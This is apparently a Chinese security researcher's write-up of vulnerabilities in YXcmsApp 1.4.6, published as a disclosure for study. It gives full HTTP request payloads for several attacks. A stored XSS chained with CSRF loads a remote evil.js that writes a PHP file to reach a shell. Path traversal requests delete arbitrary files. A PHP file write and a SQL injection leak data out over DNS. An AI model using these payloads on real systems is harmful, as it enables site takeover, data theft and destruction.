@@ -1,0 +1,93 @@
+0x00 背景
+之前有挖了yxcms app的一些漏洞，基本是后台的，打后台的知识也就发现了前台的存储XSS，然后前几天看到先知上有师傅发了前台的存储XSS结合固定会话的利用方式，我的方式不大一样，我是通过数组结合绕过正则的方法，然后使得可以无限制的进行XSS的注入，再结合CSRF进行GetShell，也一并发出来一起学习交流，另外后台的洞比较多，本文就以前发现的洞再次分析整理，还有一些洞主要用来学习的，没有实际利用作用，比如后台SQL注入，因为后台本就有执行SQL的功能。期待和师傅们的各种交流:-)
+0x01 存储型XSS
+0x00 相关环境
+源码信息：YXcmsApp1.4.6
+问题文件： \YXcmsApp1.4.6\protected\apps\default\controller\columnController.php
+漏洞类型：存储型XSS
+站点地址：http://www.yxcms.net/
+0x01 漏洞分析
+首先分析下输入过程
+在文件\YXcmsApp1.4.6\protected\apps\default\controller\columnController.php中发现如下代码块，通过在该文件的第12行中加入如下代码后，可以判断当进行留言操作的时候调用的是case 6。
+跟入extend方法，在\YXcmsApp1.4.6\protected\apps\default\controller\columnController.php文件中的第377-384行中发现如下输入数据的处理过程，把SQL库查询得到guestbook对应的tableinfo的数据作为POST请求接收的参数名，然后把接收到的数据，如果是数组便拆分数组然后进行先后两次的in方法和deletehtml方法的数据处理操作，如果是字符便丢进html_in方法进行处理 。
+guestbook的tableinfo等数据的获取方式是这样的，首先yxcms会先进行如下请求，获取guestbook对应的extendid等数据信息。
+SELECT id,name,ename,path,url,type,deep,method,tplist,keywords,description,extendid FROM yx_sort WHERE ename='guestbook' LIMIT 1
+然后会根据extendid执行SELECT id,tableinfo,name,type,defvalue FROM yx_extend WHERE id='12' OR pid='12' ORDER BY pid,norder DESC取出表单的tableinfo等信息。
+这里我的绕过方式是使用数组的操作绕过先是跟入deletehtml方法，在\YXcmsApp1.4.6\protected\include\lib\common.function.php发现该方法，通过分析如下由正则写的替换规则，可以知道会将script标签和完整闭合的<>标签替换为空，然后会将一些实体化的字符替换为原本的字符。因此可以利用类似alert(1)然后经过in方法中的htmlspecialchars进行处理，虽然把字符实体化了，但是保留了整个语句的完整性。
+如，进行如下请求，便会将完整的JS代码进行实体化的存储在数据库中，我在\YXcmsApp1.4.6\protected\include\lib\common.function.php文件的deletehtml方法中，在数据处理前打印一次，数据处理后打印一次，方便查看现象。
+现在分析下输出过程
+在\YXcmsApp1.4.6\protected\apps\admin\controller\extendfieldController.php 文件中，看到如下获取留言信息的代码块。
+跟入Extselect方法,在\YXcmsApp1.4.6\protected\apps\admin\model\extendModel.php文件中，得到如下代码，在下方将数据查询的结果打印出来，发现正是实体化后完整的JS语句。
+跟入display方法，在\YXcmsApp1.4.6\protected\include\core\cpTemplate.class.php文件中的第84行，发现如下代码。
+跟入compile方法，在\YXcmsApp1.4.6\protected\include\core\cpTemplate.class.php文件中的第131-150行，发现如下代码，在149行中加入如下代码。
+然后进行如下请求，得到模板文件的代码，从代码中可以看到，在输出的时候使用了html_out的方法。
+跟入html_out的方法，在\YXcmsApp1.4.6\protected\include\lib\common.function.php文件中的第126行-131行中发现如下代码，使用htmlspecialchars_decode,html_entity_decode,stripslashes对数据进行还原处理，因此就使得实体化后的完整JS代码，还原为正常JS代码。
+0x02 漏洞复现
+进行如下请求，使用数组的方式传入JS代码。
+POST /index.php?r=default/column/index&col=guestbook HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 238 Referer: [http://127.0.0.1/index.php](http://127.0.0.1/index.php) Cookie: PHPSESSID=4vjcrvu6keqtmr9jj4d95kpaq0 Connection: close Upgrade-Insecure-Requests: 1 tname[]=joe<script%26gt;alert(1)</script%26gt;&tel=18988888888&qq=balabalba&content=asdasdasd&checkcode=6857&__hash__=7c337b66d36c2cff79faaa48201ba66b_89efI8f3lBwpIQ%2BPtjlL52Ml4DFXLp5Fd0RAYVbXqSik2bsNwm1XYCE
+当受害者访问如下页面的时候便会触发存储XSS。
+GET /index.php?r=admin/extendfield/meslist&id=12 HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: [http://127.0.0.1/index.php?r=admin/index/index](http://127.0.0.1/index.php?r=admin/index/index) Cookie: PHPSESSID=4vjcrvu6keqtmr9jj4d95kpaq0 Connection: close Upgrade-Insecure-Requests: 1 Content-Length: 2
+先知的师傅使用了前台留言的地方的伪xss，插入html标签，结合固定会话进行攻击。
+详见：https://xianzhi.aliyun.com/forum/topic/2025
+因为本文已经绕过的检测机制，可以任意写入js代码，因此可以利用类似如下的方式获取hash然后结合文件写入漏洞GetShell<script%26gt;alert(document.getElementsByName("hash")[0].content)</script%26gt;
+首先在evil主机上设置如下代码。
+var xmlhttp1=new XMLHttpRequest(); xmlhttp1.open("POST","/index.php?r=admin/set/tpadd&Mname=default",true); xmlhttp1.setRequestHeader("Content-type","application/x-www-form-urlencoded"); xmlhttp1.send("filename=evil&code=%3C%3Fphp%0D%0Aphpinfo%28%29%3B%0D%0A%3F%3E&__hash__="+document.getElementsByName("__hash__")[0].content);
+然后在站点上进行如下留言。
+POST /index.php?r=default/column/index&col=guestbook HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 236 Referer: [http://127.0.0.1/index.php](http://127.0.0.1/index.php) Cookie: PHPSESSID=4vjcrvu6keqtmr9jj4d95kpaq0 Connection: close Upgrade-Insecure-Requests: 1 tname[]=joe<script src=[http://www.balabala.com/evil.js%26gt](http://www.balabala.com/evil.js%26gt);xss</script%26gt;&tel=18988888888&qq=balabalba&content=asdasdasd&checkcode=6857&__hash__=7c337b66d36c2cff79faaa48201ba66b_89efI8f3lBwpIQ%2BPtjlL52Ml4DFXLp5Fd0RAYVbXqSik2bsNwm1XYCE
+当管理员查看到留言便会生成evil.php恶意文件。
+0x02 任意文件删除
+0x00 相关环境
+源码信息：YXcmsApp1.4.6
+问题文件： \YXcmsApp1.4.6\protected\apps\admin\controller\filesController.php
+漏洞类型：任意文件目录及文件删除
+站点地址：http://www.yxcms.net/
+0x01 漏洞分析
+在\YXcmsApp1.4.6\protected\apps\admin\controller\filesController.php文件的第52行-61行中，发现如下代码块，其中文件路径$dirs拼接了in($_GET['fname']),然后在第57行-59行中对拼接后的路径进行判断，如果是文件目录便执行del_dir方法，如果是文件便执行unlink函数删除文件。
+跟进in方法，在\YXcmsApp1.4.6\protected\include\lib\common.function.php文件的第8-23行发现代码块，代码中对传入的数据进行htmlspecialchars和addslashes处理，但是并不会对../进行处理。
+跟进del_dir方法，在\YXcmsApp1.4.6\protected\include\lib\common.function.php的第421-436行中发现代码块，然后发现代码是先对传入文件目录的文件进行删除操作，然后再删除文件目录。
+因此\YXcmsApp1.4.6\protected\apps\admin\controller\filesController.php是存在任意文件目录和文件删除的漏洞。
+0x02 漏洞复现
+YXcmsApp1.4.6的文件路由是可以使用r=文件目录/控制器名/控制器方法 的方式访问到控制器中的公共方法，所以可以使用如下的payload进行文件删除操作，payload前要加，因为在\YXcmsApp1.4.6\protected\apps\admin\controller\filesController.php文件的第55行中将进行目录跳转从而删除任意文件，当然如果目标是文件目录，便会删除整个文件目录。，替换为/然后拼接ROOT_PATH.'upload',所以需要使用,../进行目录跳转从而删除任意文件，当然如果目标是文件目录，便会删除整个文件目录。
+GET /index.php?r=admin/files/del&fname=,../1.txt HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest Referer: [http://127.0.0.1/index.php?r=admin/files/index](http://127.0.0.1/index.php?r=admin/files/index) Cookie: PHPSESSID=bbei6n32cuevaf1lbi0n79rdj2 Connection: close
+0x03 任意文件删除
+0x00 相关环境
+源码信息：YXcmsApp1.4.6
+问题文件： \YXcmsApp1.4.6\protected\apps\admin\controller\linkController.php
+漏洞类型：任意文件删除
+站点地址：http://www.yxcms.net/
+0x01 漏洞分析
+在文件\YXcmsApp1.4.6\protected\apps\admin\controller\linkController.php中的第90-94行中发现问题代码，当$_POST['oldpicture']的值不为空的时候，会与上传文件保存路径进行拼接，然后传入到unlink中进行删除操作，整个过程并没有做任何的安全处理，因此存在任意文件删除漏洞。
+0x02 漏洞复现
+在内容管理->链接列表中 对链接进行修订，然后在oldpicture参数后面设置要删除的文件的位置，便可以进行任意文件的删除操作。
+POST /index.php?r=admin/link/edit&id=3 HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------115942706814498 Content-Length: 10279 Referer: [http://127.0.0.1/index.php?r=admin/link/edit&id=3](http://127.0.0.1/index.php?r=admin/link/edit&id=3) Cookie: PHPSESSID=4vjcrvu6keqtmr9jj4d95kpaq0 Connection: close Upgrade-Insecure-Requests: 1 -----------------------------115942706814498 Content-Disposition: form-data; name="groupname" friends -----------------------------115942706814498 Content-Disposition: form-data; name="webname" Yxcms -----------------------------115942706814498 Content-Disposition: form-data; name="url" [http://www.yxcms.net](http://www.yxcms.net) -----------------------------115942706814498 Content-Disposition: form-data; name="picture"; filename="balabla.jpg" Content-Type: image/jpeg ÿØÿà -----------------------------115942706814498 Content-Disposition: form-data; name="oldpicture" ../../test.txt -----------------------------115942706814498 Content-Disposition: form-data; name="logourl" -----------------------------115942706814498 Content-Disposition: form-data; name="info" Yxcms是一款高效,灵活,实用,免费的企业建站系统 -----------------------------115942706814498 Content-Disposition: form-data; name="norder" 100 -----------------------------115942706814498 Content-Disposition: form-data; name="ispass" 1 -----------------------------115942706814498 Content-Disposition: form-data; name="__hash__" ca3c25d7cb9c6584f6a3f15491b0924b_04d8UhpVCCyyROtTjE+mnBTPtzqNCiR33AldtmNARb8DOwktyvPiKLc -----------------------------115942706814498--
+0x04 文件写入漏洞
+0x00 相关环境
+源码信息：YXcmsApp1.4.6
+问题文件： \YXcmsApp1.4.6\protected\apps\admin\controller\setController.php
+漏洞类型：文件写入漏洞
+站点地址：http://www.yxcms.net/
+0x01 漏洞分析
+在文件 \YXcmsApp1.4.6\protected\apps\admin\controller\setController.php的第140-161行代码中，发现如下代码块，其中第152行中使用了file_put_contents写入文件，且传入的参数未经过安全处理，且指定后缀为PHP文件，所以可以通过写入恶意PHP代码获取服务器权限。
+0x02 漏洞复现
+YXcmsApp1.4.6的文件路由是可以使用r=文件目录/控制器名/控制器方法 的方式访问到控制器中的公共方法，也可以在后台的前台模板->模板管理中的新建模板，进行如下请求，在filename参数设置文件名，code设置为文件内容，然后进行如下请求，便会添加一个evil.php的恶意文件。
+POST /index.php?r=admin/set/tpadd&Mname=default HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 165 Referer: [http://127.0.0.1/index.php?r=admin/set/tpadd&Mname=default](http://127.0.0.1/index.php?r=admin/set/tpadd&Mname=default) Cookie: PHPSESSID=bbei6n32cuevaf1lbi0n79rdj2; Connection: close Upgrade-Insecure-Requests: 1 filename=evil&code=%3C%3Fphp%0D%0Aphpinfo%28%29%3B%0D%0A%3F%3E&__hash__=a68c4298ea89667cee4744db6ecba878_250cIYFldqtRr6mAExOK0F%2FLl0HqXu6HdtoIYL%2FaC4q4WyT3CzrTnNxz
+创建好后访问http://127.0.0.1/protected/apps/default/view/default/evil.php便可以执行相应的PHP代码。
+存在相同问题的还有\YXcmsApp1.4.6\protected\apps\admin\controller\setController.php同文件下的tpedit方法。
+0x05 SQL注入漏洞
+0x00 相关环境
+源码信息：YXcmsApp1.4.6
+问题文件： \YXcmsApp1.4.6\protected\apps\admin\controller\fragmentController.php
+漏洞类型：SQL注入漏洞
+站点地址：http://www.yxcms.net/
+0x01 漏洞分析
+在\YXcmsApp1.4.6\protected\apps\admin\controller\fragmentController.php文件中的第63行-76行中发现如下代码块，在代码的第74行中，把使用implode函数对$_POST['delid']数组转换为字符的结果直接传入delete方法。
+跟进delete方法，在\YXcmsApp1.4.6\protected\base\model\model.php文件中的第45-47行中发现代码块。
+继续跟进delete方法，在\YXcmsApp1.4.6\protected\include\core\cpModel.class.php文件的第145-153行中发现代码块，该方法对接收到的数据进行delete的数据库操作，未发现安全处理的代码，且条件是通过$this->_parseCondition()获取的。
+跟入_parseCondition()方法，在\YXcmsApp1.4.6\protected\include\core\cpModel.class.php文件第223-232行中发现代码块。
+在\YXcmsApp1.4.6\protected\include\core\cpModel.class.php文件中的第36-44行中发现了如下代码块，会接收数组中的方法以及方法里面的参数值。
+跟进parseCondition方法，在\YXcmsApp1.4.6\protected\include\core\db\cpMysql.class.php文件中第128-158行中发现如下代码块，该方法是对传入的数据进行拼接赋值处理，并且在文件的第当传入的是字符串的时候直接拼接数据，当传入的是数组的时候会把数组中的每个值进行escape处理。
+跟进escape方法,在\YXcmsApp1.4.6\protected\include\core\db\cpMysql.class.php文件中发现代码块，从代码可以知道是做了mysql_real_escape_string
+因此整个数据传递过程仅对数组进行mysql_real_escape_string处理，又因为问题位置是数字型注入，所以可以直接进行SQL注入，获取数据库中的信息。
+0x02 漏洞复现
+在碎片列表的中进行如下的删除操作，然后使用dnslog获取SQL注入得到数据，得到数据名为yxcms。
+POST /index.php?r=admin/fragment/del HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 188 Referer: [http://127.0.0.1/index.php?r=admin/fragment/index](http://127.0.0.1/index.php?r=admin/fragment/index) Cookie: PHPSESSID=bbei6n32cuevaf1lbi0n79rdj2; Connection: close Upgrade-Insecure-Requests: 1 delid%5B%5D=select LOAD_FILE((CONCAT('\\\\',(SELECT DATABASE()),'.8571e594.2m1.pw\\abc')))&__hash__=529fbedab8a7b8a3f3f5a0f394f51cf2_08ebfXTKPoKd0tX4iq+aFMwhq5QkkRGC/NfUu/Ny83+UmU8u0MoCIj8
